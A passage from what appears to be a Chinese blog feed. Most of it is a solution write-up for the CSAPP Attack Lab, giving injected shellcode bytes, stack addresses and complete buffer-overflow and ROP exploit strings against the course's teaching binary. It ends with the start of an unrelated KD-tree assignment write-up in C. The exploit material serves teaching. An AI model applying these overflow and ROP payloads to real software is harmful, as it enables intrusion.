punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">validate</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Misfire: You called touch2(0x%.8x)\n"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">fail</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>touch2</code> 函数地址是 <code>0x401d29</code>.</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">0000000000401d29 &lt;touch2&gt;:  401d29:f3 0f 1e fa          endbr64   401d2d:50                   push   %rax  401d2e:58                   pop    %rax  ...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>解题思路:</p><ul><li>将返回地址设置为注入代码的地址, 选择在栈顶注入, 返回地址则设置为 <code>%rsp</code>.</li><li>将 <code>cookie</code> 值移入 <code>%rdi</code>, 随之被 <code>touch2</code> 作为参数调用.</li><li>接下来不能直接使用 <code>call</code>, <code>jmp</code> 指令调用 <code>touch2</code>, 只能先将 <code>touch2</code> 的地址压栈, 并使用 <code>ret</code> 改变当前 <code>%rip</code> 的指向地址.</li></ul><p>注入代码为:</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly"># 2.s movq   $0x36bf93ac, %rdipushq  $0x401d29retq<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>然后执行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">linux<span class="token operator">&gt;</span> gcc <span class="token parameter variable">-c</span> <span class="token number">2</span>.slinux<span class="token operator">&gt;</span> objdump <span class="token parameter variable">-d</span> <span class="token number">2</span>.o <span class="token operator">&gt;</span> <span class="token number">2</span>.d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>得到机器代码:</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly"># 2.d2.o:     file format elf64-x86-64Disassembly of section .text:0000000000000000 &lt;.text&gt;:   0:48 c7 c7 ac 93 bf 36 movq   $0x36bf93ac,%rdi   7:68 29 1d 40 00       pushq  $0x401d29   c:c3                   retq   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们只需将指令序列 <code>48 c7 c7 ac 93 bf 36 68 29 1d 40 00 c3</code> 注入栈顶. 下面寻找 <code>getbuf</code> 运行栈的栈顶地址 <code>%rsp</code>, 使用 <code>gdb</code> 调试.</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">linux<span class="token operator">&gt;</span> gdb ctarget<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span><span class="token operator">&gt;</span> <span class="token builtin class-name">break</span> getbuf<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span><span class="token operator">&gt;</span> run <span class="token parameter variable">-q</span><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span><span class="token operator">&gt;</span> disas<span class="token operator">=</span><span class="token operator">&gt;</span> 0x0000000000401cdb <span class="token operator">&lt;</span>+<span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span>:     endbr64    0x0000000000401cdf <span class="token operator">&lt;</span>+<span class="token operator"><span class="token file-descriptor important">4</span>&gt;</span>:     sub    <span class="token variable">$0x38</span>,%rsp   0x0000000000401ce3 <span class="token operator">&lt;</span>+<span class="token operator"><span class="token file-descriptor important">8</span>&gt;</span>:     mov    %rsp,%rdi   0x0000000000401ce6 <span class="token operator">&lt;</span>+1<span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span>:    callq  0x401fa0 <span class="token operator">&lt;</span>Gets<span class="token operator">&gt;</span>   0x0000000000401ceb <span class="token operator">&lt;</span>+1<span class="token operator"><span class="token file-descriptor important">6</span>&gt;</span>:    mov    <span class="token variable">$0x1</span>,%eax   0x0000000000401cf0 <span class="token operator">&lt;</span>+2<span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span>:    <span class="token function">add</span>    <span class="token variable">$0x38</span>,%rsp<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> stepi0x0000000000401cdf      <span class="token number">12</span>      <span class="token keyword">in</span> buf.c<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> stepi<span class="token number">14</span>      <span class="token keyword">in</span> buf.c<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> p /x <span class="token variable">$rsp</span><span class="token variable">$1</span> <span class="token operator">=</span> 0x55633168<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从而 <code>%rsp</code> 为 <code>0x55633168</code>.</p><p><img src="/pic/37.png" alt="栈帧结构"></p><p>下面构建输入字符串: 首先注入攻击代码, 然后使用 <code>0x00</code> 填充满栈上 <code>56</code> 个字节, 最后填充攻击代码的起始地址.</p><pre class="line-numbers language-none"><code class="language-none"># 2.txt48 c7 c7 ac 93 bf 36 6829 1d 40 00 c3 00 00 00  &lt;----- 注入代码00 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00  68 31 63 55 00 00 00 00  &lt;----- 注入代码的起始地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h3><p>需要在输入字符串中注入一段代码, 将 <code>cookie</code> 变为字符串并传入 <code>%rdi</code>, 然后程序流跳转到 <code>touch3</code> 函数.</p><p><code>hexmatch</code>函数检查 <code>cookie</code> 和传进来的字符是否匹配.</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">hexmatch</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> val<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>sval<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> cbuf<span class="token punctuation">[</span><span class="token number">110</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s <span class="token operator">=</span> cbuf <span class="token operator">+</span> <span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">100</span><span class="token punctuation">;</span>    <span class="token function">sprintf</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">"%.8x"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">strncmp</span><span class="token punctuation">(</span>sval<span class="token punctuation">,</span> s<span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>touch3</code> 函数会调用 <code>hexmatch</code> 函数验证传入的参数 <code>val</code> 是否和 <code>cookie</code> 相等.</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">touch3</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>sval<span class="token punctuation">)</span><span class="token punctuation">{</span>    vlevel <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">hexmatch</span><span class="token punctuation">(</span>cookie<span class="token punctuation">,</span> sval<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Touch3!: You called touch3(\"%s\")\n"</span><span class="token punctuation">,</span> sval<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">validate</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Misfire: You called touch3(\"%s\")\n"</span><span class="token punctuation">,</span> sval<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">fail</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果将 <code>cookie</code> 串存放在 <code>getbuf</code> 栈帧中, 注意到 <code>hexmatch</code> 中 <code>char *s = cbuf + random() % 100</code> 可能会覆盖原 <code>getbuf</code> 栈帧, 造成数据丢失, 因此需将 <code>cookie</code> 串存放在 <code>test</code> 栈帧中.</p><p>解题思路:</p><ul><li>将 <code>cookie</code> 转为 <code>16</code> 进制字符串存放在 <code>test</code> 栈帧中.</li><li>将 <code>cookie</code> 串的地址移入 <code>%rdi</code>, 随之被 <code>touch3</code> 作为参数调用 (结合 <code>%rsp</code> 的地址与相对偏移量可确定).</li><li>接下来不能直接使用 <code>call</code>, <code>jmp</code> 指令调用 <code>touch3</code>, 只能先将 <code>touch3</code> 的地址压栈, 并使用 <code>ret</code> 改变当前 <code>%rip</code> 的指向地址.</li></ul><p><code>getbuf</code> 运行栈的栈顶地址 <code>%rsp</code> 为 <code>0x55633168</code>, 字符串 <code>cookie</code> 的 <code>ascii</code> 表示为 <code>33 36 62 66 39 33 61 63 00</code>, 距 <code>%rsp</code> 的偏移量为 <code>0x40</code>, 因此其地址为 <code>0x556331a8</code>. 注入代码为:</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly"># 3.s mov    $0x556331a8, %rdipushq  $0x401e4eretq<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>然后执行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">linux<span class="token operator">&gt;</span> gcc <span class="token parameter variable">-c</span> <span class="token number">3</span>.slinux<span class="token operator">&gt;</span> objdump <span class="token parameter variable">-d</span> <span class="token number">3</span>.o <span class="token operator">&gt;</span> <span class="token number">3</span>.d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>得到机器代码:</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly"># 3.d3.o:     file format elf64-x86-64Disassembly of section .text:0000000000000000 &lt;.text&gt;:   0:48 c7 c7 a8 31 63 55 mov    $0x556331a8,%rdi   7:68 4e 1e 40 00       pushq  $0x401e4e   c:c3                   retq   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们只需将指令序列 <code>48 c7 c7 a8 31 63 55 68 4e 1e 40 00 c3</code> 注入栈顶.</p><p><img src="/pic/38.png" alt="栈帧结构"></p><p>下面构建输入字符串: 首先注入攻击代码, 然后使用 <code>0x00</code> 填充满栈上 <code>56</code> 个字节, 最后填充攻击代码的起始地址, 并保存 <code>cookie</code> 字符串.</p><pre class="line-numbers language-none"><code class="language-none"># 3.txt48 c7 c7 a8 31 63 55 68  &lt;----- 注入代码4e 1e 40 00 c3 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0068 31 63 55 00 00 00 00  &lt;----- 注入代码的起始地址33 36 62 66 39 33 61 6300                      &lt;----- cookie 字符串<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Return-Oriented-Programming-Attacks"><a href="#Return-Oriented-Programming-Attacks" class="headerlink" title="Return-Oriented Programming Attacks"></a>Return-Oriented Programming Attacks</h2><h3 id="Level-2-1"><a href="#Level-2-1" class="headerlink" title="Level 2"></a>Level 2</h3><p>需要做的是重复 <code>Code Injection Attacks</code> 中第二阶段的任务, 把 <code>cookie</code> 值传送到 <code>%rdi</code>, 然后调用 <code>touch2</code>. 但是无法再将指令序列放入到栈中, 而是需要在程序的 <code>gadget farm</code> 中找到需要的指令序列.</p><p>需要的代码为:</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">popq %rax       # 将 cookie 存入 %raxmovq %rax, %rdi # 将 cookie 存入 %rdi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><code>popq %rax</code> 的指令字节为 <code>58</code>，找到了如下函数:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">0000000000401f1d <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>setval_439</span><span class="token punctuation">&gt;</span></span>:  401f1d:f3 0f 1e fa          endbr64   401f21:c7 07 58 c3 4c cf    movl   $0xcf4cc358,(%rdi)  401f27:c3                   retq   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>得出 <code>popq %rax</code> 指令的地址为 <code>0x401f23</code>.</p><p><code>movq %rax, %rdi</code> 的指令字节为 <code>48 89 c7</code>, 找到了如下函数:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">0000000000401f12 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>setval_318</span><span class="token punctuation">&gt;</span></span>:  401f12:f3 0f 1e fa          endbr64   401f16:c7 07 6f 48 89 c7    movl   $0xc789486f,(%rdi)  401f1c:c3                   retq   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>得出 <code>movq %rax, %rdi</code> 指令的地址为 <code>0x401f19</code>.</p><p><img src="/pic/39.png" alt="栈帧结构"></p><p>下面构建输入字符串: 首先填充 <code>popq %rax</code> 指令, 注入 <code>cookie</code> 的值, 接着填入 <code>movq %rax, %rdi</code> 指令与 <code>touch2</code> 函数的起始地址.</p><pre class="line-numbers language-undefined" data-language="undefined"><code class="language-undefined">00 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0023 1f 40 00 00 00 00 00  &lt;----- popq %raxac 93 bf 36 00 00 00 00  &lt;----- coookie19 1f 40 00 00 00 00 00  &lt;----- movq %rax, %rdi29 1d 40 00 00 00 00 00  &lt;----- touch2 的起始地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Level-3-1"><a href="#Level-3-1" class="headerlink" title="Level 3"></a>Level 3</h3><p>需要做的是重复 <code>Code Injection Attacks</code> 中第三阶段的任务, 把 <code>cookie</code> 字符串的起始地址传送到 <code>%rdi</code>, 然后调用 <code>touch3</code>. 但是无法再将指令序列放入到栈中, 而是需要在程序的 <code>gadget farm</code> 中找到需要的指令序列.</p><p>因为程序使用栈随机化增强安全性能, 只能用栈顶地址 + 偏移量来索引 <code>cookie</code> 字符串的起始地址.</p><p>注意到 <code>farm</code> 中已经存在了一个 <code>add_xy</code> 函数, 可以考虑将 <code>%rsp</code> 传入 <code>%rdi</code>, 将偏移量传入 <code>%rsi</code>, 进而计算出 <code>cookie</code> 字符串的首地址, 并传送到 <code>%rax</code>.</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">0000000000401f5b &lt;add_xy&gt;:  401f5b:f3 0f 1e fa          endbr64   401f5f:48 8d 04 37          lea    (%rdi,%rsi,1),%rax  401f63:c3                   retq   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>将 <code>%rsp</code> 传入 <code>%rdi</code> 需要的代码为:</li></ul><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">movq %rsp, %raxmovq %rax, %rdi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>将偏移量传入 <code>%rsi</code> 需要的代码为:</li></ul><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">popq %raxmovq %eax, %ecxmovq %ecx, %edxmovq %edx, %esi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>最困难的一条指令、也是唯一没有使用 <code>c3</code> 或 <code>90</code> 结尾的 <code>gadget</code> 指令为: 从 <code>%ecx</code> 传入 <code>%esi</code>. </p><p>这一步的指令字节为 <code>89 ca</code>, 而 <code>08 db</code> 为一个<code>nop</code> 指令 <code>orb %bl %bl</code> 的编码, 因此 <code>0x401fe9</code>是一个符合要求的 <code>gadget</code> 地址. </p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">0000000000401fe3 &lt;setval_370&gt;:  401fe3:f3 0f 1e fa          endbr64   401fe7:c7 07 89 ca 08 db    movl   $0xdb08ca89,(%rdi)  401fed:c3                   retq   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>计算 <code>cookie</code> 地址, 传入 <code>%rdi</code> 需要的代码为:</li></ul><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">lea  (%rdi,%rsi,1),%raxmovq %rax, %rdi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>获取 <code>%rsp</code> 的指令与 <code>cookie</code> 字符串的存储地址间隔了九条 <code>8</code> 字节指令, 因此偏移量为 <code>0x48</code>.</p><p><img src="/pic/40.png" alt="栈帧结构"></p><p>下面构建输入字符串:</p><pre class="line-numbers language-none"><code class="language-none">00 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00d3 1f 40 00 00 00 00 00  &lt;----- movq %rsp, %rax19 1f 40 00 00 00 00 00  &lt;----- movq %rax, %rdi23 1f 40 00 00 00 00 00  &lt;----- popq %rax48 00 00 00 00 00 00 00  &lt;----- cookie 字符串偏移量3f 20 40 00 00 00 00 00  &lt;----- movq %eax, %ecxe9 1f 40 00 00 00 00 00  &lt;----- movq %ecx, %edxa9 20 40 00 00 00 00 00  &lt;----- movq %edx, %esi5b 1f 40 00 00 00 00 00  &lt;----- lea  (%rdi,%rsi,1),%rax19 1f 40 00 00 00 00 00  &lt;----- movq %rax, %rdi4e 1e 40 00 00 00 00 00  &lt;----- touch3 的起始地址33 36 62 66 39 33 61 6300                       &lt;----- cookie 字符串<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> CSAPP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nearest Neighbour</title>
      <link href="/30/"/>
      <url>/30/</url>
      
        <content type="html"><![CDATA[<h1 id="CST-PA3"><a href="#CST-PA3" class="headerlink" title="CST PA3"></a>CST PA3</h1><h2 id="3-6-Nearest-Neighbour"><a href="#3-6-Nearest-Neighbour" class="headerlink" title="3-6 Nearest Neighbour"></a>3-6 Nearest Neighbour</h2><h3 id="算法构思"><a href="#算法构思" class="headerlink" title="算法构思"></a>算法构思</h3><p>本题需使用 <code>KD-Tree</code> 数据结构.</p><h4 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// Line 16</span><span class="token keyword">struct</span> <span class="token class-name">Node</span> <span class="token punctuation">{</span>public<span class="token operator">:</span>    <span class="token keyword">int</span> d<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    bool friend operator<span class="token operator">&lt;</span><span class="token punctuation">(</span>Node x<span class="token punctuation">,</span> Node y<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> x<span class="token punctuation">.</span>d<span class="token punctuation">[</span>comp<span class="token punctuation">]</span> <span class="token operator">&lt;</span> y<span class="token punctuation">.</span>d<span class="token punctuation">[</span>comp<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> node<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">,</span> p<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用全局变量 <code>int dimension</code> 记录操作向量的维数, <code>Node</code> 结构体支持存储一个 $k$ 维向量, 其中 $2\le k\le 5$.</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// Line 26</span><span class="token keyword">struct</span> <span class="token class-name">Tree</span> <span class="token punctuation">{</span>public<span class="token operator">:</span>    <span class="token keyword">int</span> v<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    Node p<span class="token punctuation">;</span>    bool leftnode <span class="token operator">=</span> false<span class="token punctuation">;</span>    bool rightnode <span class="token operator">=</span> false<span class="token punctuation">;</span>    bool is_leaf <span class="token operator">=</span> false<span class="token punctuation">;</span><span class="token punctuation">}</span> tree<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> N<span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>每个 <code>Tree</code> 结构体实例对应 <code>KD-Tree</code> 中的一个节点, <code>leftnode</code> 与 <code>rightnode</code> 记录了其是否存在左、右子节点, <code>is_leaf</code> 记录其是否为叶节点.</p><p>每个 <code>Tree</code> 实例内部保存了一个向量 <code>Node p</code>, 而 <code>int v[5][2]</code> 记录了其对应的 <code>KD-Tree</code> 节点集在 $k$ 维空间内覆盖的范围, 其中 <code>v[i][0]</code>, <code>v[i][1]</code> 分别记录了 <code>Tree</code> 节点在空间中第 $i$ 维的范围.</p><h4 id="Euclid-距离"><a href="#Euclid-距离" class="headerlink" title="Euclid 距离"></a>Euclid 距离</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// Line 36</span>ll <span class="token function">Dist</span><span class="token punctuation">(</span>Node x<span class="token punctuation">,</span> Node y<span class="token punctuation">)</span><span class="token punctuation">{</span>    ll dis <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> dimension<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        dis <span class="token operator">+=</span> <span class="token number">1ll</span> <span class="token operator">*</span> <span class="token punctuation">(</span>x<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> y<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>x<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> y<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> dis<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先为两个向量定义其 $Euclid$ 距离.</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// Line 44</span>ll <span class="token function">Dist</span><span class="token punctuation">(</span>Node x<span class="token punctuation">,</span> Tree y<span class="token punctuation">)</span><span class="token punctuation">{</span>    ll dis <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> dist<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> dimension<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>x<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> y<span class="token punctuation">.</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> dist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> y<span class="token punctuation">.</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> x<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>x<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&gt;</span> y<span class="token punctuation">.</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> dist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> x<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> y<span class="token punctuation">.</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> dist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> dimension<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        dis <span class="token operator">+=</span> <span class="token number">1ll</span> <span class="token operator">*</span> dist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> dist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> dis<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再为一个点与一个区域定义其最短 $Euclid$ 距离. 逐次比较该点第 $i$ 维的坐标与区域在第 $i$ 维的坐标范围, 并取最短距离. 将每个维度的距离综合即得到了该点到此区域的最短 $Euclid$ 距离.</p><h4 id="中位排序"><a href="#中位排序" class="headerlink" title="中位排序"></a>中位排序</h4><p>我们定义一个中位排序操作, 它将序列的中位数放置到正确的位置, 同时满足前半段的元素均小于中位元素, 后半段的元素均大于中位元素.</p><p>该算法具体实现参考自<a href="https://zhuanlan.zhihu.com/p/145456043">此教程</a>, 是一种期望为线性时间的选择算法, 时间复杂度在平均情况下为 $O(n)$.</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// Line 58</span><span class="token keyword">void</span> <span class="token function">Swap</span><span class="token punctuation">(</span><span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span> <span class="token punctuation">{</span>    Node tmp <span class="token operator">=</span> node<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">;</span>    node<span class="token punctuation">[</span>l<span class="token punctuation">]</span> <span class="token operator">=</span> node<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">;</span>    node<span class="token punctuation">[</span>r<span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">Partion</span><span class="token punctuation">(</span><span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> k <span class="token operator">=</span> l<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> l<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> r<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>node<span 